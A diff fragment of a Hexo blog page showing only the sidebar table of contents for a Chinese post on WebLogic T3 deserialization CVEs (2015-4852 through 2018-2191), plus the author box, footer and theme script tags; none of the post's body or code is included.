+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%95%E4%B8%BAT3%E5%8D%8F%E8%AE%AE"><span class="nav-number">2.</span> <span class="nav-text">何为T3协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2015-4852"><span class="nav-number">3.</span> <span class="nav-text">漏洞复现(CVE-2015-4852)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">4.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90"><span class="nav-number">4.0.1.</span> <span class="nav-text">数据包分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95"><span class="nav-number">4.0.2.</span> <span class="nav-text">代码分析与调试</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D"><span class="nav-number">5.</span> <span class="nav-text">修复</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D%E7%BB%95%E8%BF%87%EF%BC%88CVE-2016-0638%EF%BC%89"><span class="nav-number">6.</span> <span class="nav-text">修复绕过（CVE-2016-0638）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AE%80%E8%BF%B0"><span class="nav-number">6.0.1.</span> <span class="nav-text">简述</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95"><span class="nav-number">6.0.2.</span> <span class="nav-text">修复分析与调试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90"><span class="nav-number">6.0.3.</span> <span class="nav-text">绕过工具分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="nav-number">6.0.4.</span> <span class="nav-text">漏洞分析</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%A6%E4%B8%80%E7%A7%8D%E7%BB%95%E8%BF%87%EF%BC%88CVE-2016-3510%EF%BC%89"><span class="nav-number">7.</span> <span class="nav-text">另一种绕过（CVE-2016-3510）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2017-3248-CVE-2018-2628"><span class="nav-number">8.</span> <span class="nav-text">CVE-2017-3248 &amp; CVE-2018-2628</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">8.0.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">8.0.2.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2"><span class="nav-number">8.0.3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90%E5%8F%8A%E7%BB%95%E8%BF%87"><span class="nav-number">8.0.4.</span> <span class="nav-text">补丁分析及绕过</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2018-2191"><span class="nav-number">9.</span> <span class="nav-text">CVE-2018-2191</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">57</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
